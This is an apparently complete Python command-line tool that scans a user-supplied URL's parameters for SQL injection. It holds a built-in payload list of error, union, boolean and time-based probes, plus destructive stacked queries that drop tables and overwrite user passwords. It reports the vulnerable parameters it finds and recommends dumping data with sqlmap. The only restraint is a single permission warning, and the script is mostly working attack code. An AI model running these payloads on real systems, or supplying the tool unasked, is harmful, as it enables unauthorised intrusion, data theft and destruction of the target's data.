#!/usr/bin/env python3
"""
Automated SQL Injection Tester
Advanced SQL injection detection and exploitation tool
"""

import requests
import urllib.parse
import time
import re
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run():
    print("\033[92m" + "="*70)
    print("           AUTOMATED SQL INJECTION TESTER")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test applications you own or have permission to test!\033[0m\n")
    
    # SQL Injection Payloads Database
    SQL_PAYLOADS = {
        'error_based': [
            "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
            "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "1' AND 1=1--", "1' AND 1=2--"
        ],
        'union_based': [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
            "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "1' UNION SELECT user(),database()--", "1' UNION SELECT version(),@@version--"
        ],
        'boolean_based': [
            "1' AND '1'='1", "1' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
            "1 AND 1=1", "1 AND 1=2", "' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('A'))--"
        ],
        'time_based': [
            "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5('test'))--",
            "1'; WAITFOR DELAY '00:00:05'--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR SLEEP(5)--", "1' AND IF(1=1,SLEEP(5),0)--"
        ],
        'stacked_queries': [
            "'; DROP TABLE users--", "1'; UPDATE users SET password='hacked'--",
            "1'; INSERT INTO users VALUES('hacker','pass')--", "1'; EXEC sp_MSforeachtable 'DROP TABLE ?'--"
        ]
    }
    
    ERROR_SIGNATURES = [
        'SQL syntax', 'mysql_fetch', 'Warning: mysql', 'mysqli_', 'MySQLSyntaxErrorException',
        'valid MySQL result', 'PostgreSQL.*ERROR', 'Warning.*pg_', 'valid PostgreSQL result',
        'Npgsql.', 'Driver.*SQL.*Error', 'ORA-', 'Oracle.*Driver', 'oracle.*error',
        'Microsoft SQL Native Client error', 'ODBC SQL Server Driver', 'SQLServer JDBC Driver',
        'SqlClient', 'Unclosed quotation mark', 'quoted string not properly terminated',
        'Error Executing Database Query', 'Microsoft JET Database', 'ADODB.Field error',
        'iBATIS', 'Dynamic SQL Error', 'Sybase message', 'DB2 SQL error',
        '[SQLITE_ERROR]', 'SQLite/JDBCDriver', 'System.Data.SQLite.SQLiteException'
    ]
    
    target_url = input("\033[97m[?] Enter target URL (with parameter, e.g., http://site.com/page?id=1): \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    print("\n\033[97m[*] Testing Options:\033[0m")
    print("  [1] Quick Scan (Error-based only)")
    print("  [2] Standard Scan (Error + Boolean)")
    print("  [3] Advanced Scan (All techniques)")
    print("  [4] Custom Payload Test")
    print("  [5] Time-based Blind SQLi")
    
    choice = input("\n\033[95m[?] Select scan type: \033[0m").strip()
    
    # Parse URL and parameters
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    if not params:
        print("\033[91m[!] No parameters found in URL. Please provide a URL with parameters.\033[0m")
        return
    
    print(f"\n\033[92m[*] Target: {base_url}\033[0m")
    print(f"\033[97m[*] Parameters found: {list(params.keys())}\033[0m\n")
    
    vulnerabilities = []
    
    def test_payload(param_name, payload, technique):
        """Test a single payload"""
        try:
            # Create modified parameters
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            # Build URL
            query_string = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            
            # Send request with timeout
            start_time = time.time()
            response = requests.get(test_url, timeout=10, verify=False, allow_redirects=True)
            response_time = time.time() - start_time
            
            # Check for SQL errors
            for signature in ERROR_SIGNATURES:
                if re.search(signature, response.text, re.IGNORECASE):
                    return {
                        'vulnerable': True,
                        'param': param_name,
                        'payload': payload,
                        'technique': technique,
                        'evidence': signature,
                        'response_code': response.status_code
                    }
            
            # Time-based detection
            if technique == 'time_based' and response_time > 4:
                return {
                    'vulnerable': True,
                    'param': param_name,
                    'payload': payload,
                    'technique': technique,
                    'evidence': f'Delayed response ({response_time:.2f}s)',
                    'response_code': response.status_code
                }
            
            return None
            
        except requests.Timeout:
            if 'SLEEP' in payload or 'WAITFOR' in payload:
                return {
                    'vulnerable': True,
                    'param': param_name,
                    'payload': payload,
                    'technique': 'time_based',
                    'evidence': 'Request timeout (possible time-based SQLi)',
                    'response_code': 'TIMEOUT'
                }
        except Exception as e:
            return None
    
    # Select payloads based on scan type
    payloads_to_test = []
    
    if choice == '1':
        payloads_to_test = [('error_based', p) for p in SQL_PAYLOADS['error_based']]
    elif choice == '2':
        payloads_to_test = [('error_based', p) for p in SQL_PAYLOADS['error_based']]
        payloads_to_test += [('boolean_based', p) for p in SQL_PAYLOADS['boolean_based']]
    elif choice == '3':
        for technique, payloads in SQL_PAYLOADS.items():
            payloads_to_test += [(technique, p) for p in payloads]
    elif choice == '4':
        custom_payload = input("\033[97m[?] Enter custom SQL payload: \033[0m").strip()
        if custom_payload:
            payloads_to_test = [('custom', custom_payload)]
    elif choice == '5':
        payloads_to_test = [('time_based', p) for p in SQL_PAYLOADS['time_based']]
    else:
        print("\033[91m[!] Invalid choice.\033[0m")
        return
    
    print(f"\n\033[92m[*] Starting SQL injection test with {len(payloads_to_test)} payloads...\033[0m")
    print("\033[93m[*] This may take a while...\033[0m\n")
    
    tested = 0
    
    # Test each parameter with each payload
    for param_name in params.keys():
        print(f"\033[96m[*] Testing parameter: {param_name}\033[0m")
        
        for technique, payload in payloads_to_test:
            tested += 1
            print(f"\r\033[97m[*] Progress: {tested}/{len(payloads_to_test) * len(params)} payloads tested\033[0m", end='', flush=True)
            
            result = test_payload(param_name, payload, technique)
            
            if result and result['vulnerable']:
                vulnerabilities.append(result)
                print(f"\n\033[91m[!] VULNERABILITY FOUND!\033[0m")
                print(f"    \033[93mParameter: {result['param']}\033[0m")
                print(f"    \033[93mTechnique: {result['technique']}\033[0m")
                print(f"    \033[93mPayload: {result['payload'][:50]}...\033[0m")
                print(f"    \033[93mEvidence: {result['evidence']}\033[0m\n")
            
            time.sleep(0.1)  # Rate limiting
    
    print("\n")
    
    # Results Summary
    print(f"\n\033[92m{'='*70}\033[0m")
    print(f"\033[92m[*] SQL Injection Testing Complete\033[0m")
    print(f"\033[92m{'='*70}\033[0m\n")
    
    if vulnerabilities:
        print(f"\033[91m[!] FOUND {len(vulnerabilities)} POTENTIAL SQL INJECTION VULNERABILITIES!\033[0m\n")
        
        # Group by parameter
        vuln_by_param = {}
        for v in vulnerabilities:
            if v['param'] not in vuln_by_param:
                vuln_by_param[v['param']] = []
            vuln_by_param[v['param']].append(v)
        
        for param, vulns in vuln_by_param.items():
            print(f"\033[93m[+] Parameter: {param}\033[0m")
            techniques = set([v['technique'] for v in vulns])
            print(f"    \033[97mVulnerable to: {', '.join(techniques)}\033[0m")
            print(f"    \033[97mTotal payloads: {len(vulns)}\033[0m\n")
        
        # Save results
        save = input("\033[95m[?] Save detailed results to file? (y/n): \033[0m").strip().lower()
        if save == 'y':
            filename = input("\033[97m[?] Enter filename (default: sqli_results.txt): \033[0m").strip() or "sqli_results.txt"
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"SQL Injection Test Results\n")
                    f.write(f"{'='*70}\n")
                    f.write(f"Target: {target_url}\n")
                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n\n")
                    
                    for param, vulns in vuln_by_param.items():
                        f.write(f"\nParameter: {param}\n")
                        f.write(f"{'-'*70}\n")
                        for v in vulns:
                            f.write(f"Technique: {v['technique']}\n")
                            f.write(f"Payload: {v['payload']}\n")
                            f.write(f"Evidence: {v['evidence']}\n")
                            f.write(f"Response Code: {v['response_code']}\n\n")
                
                print(f"\033[92m[*] Results saved to {filename}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Error saving file: {str(e)}\033[0m")
        
        # Exploitation recommendations
        print(f"\n\033[96m[*] Recommended Next Steps:\033[0m")
        if any(v['technique'] == 'union_based' for v in vulnerabilities):
            print("  • Use UNION-based payloads to extract data")
            print("  • Try: sqlmap -u \"{}\" --dump".format(target_url))
        if any(v['technique'] == 'time_based' for v in vulnerabilities):
            print("  • Use time-based blind SQLi for data extraction")
            print("  • Consider automated tools for blind SQLi")
        
    else:
        print(f"\033[92m[*] No SQL injection vulnerabilities detected.\033[0m")
        print(f"\033[97m[*] The application appears to be protected against basic SQL injection.\033[0m")
    
    print(f"\n\033[97m[*] Total payloads tested: {tested}\033[0m")
    print(f"\033[97m[*] Parameters tested: {len(params)}\033[0m\n")

if __name__ == "__main__":
    run()
